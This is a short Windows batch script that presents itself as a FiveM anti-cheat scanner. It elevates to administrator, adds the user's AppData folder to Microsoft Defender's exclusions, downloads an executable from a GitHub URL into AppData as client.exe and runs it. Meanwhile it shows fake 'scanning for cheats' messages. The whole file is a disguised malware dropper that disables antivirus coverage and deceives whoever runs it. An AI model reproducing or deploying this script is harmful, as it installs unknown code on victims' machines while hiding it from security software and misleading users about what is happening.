@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "url=https://github.com/crow-v3/lvl-1/raw/refs/heads/main/Update.exe"
set "output=%USERPROFILE%\AppData\client.exe"

echo Checking for cheats...
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\\AppData"

timeout /t 1 >nul

echo Check fivem files (plugins)...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

echo scan for cheats (tz,keyser)...
start "" "%output%"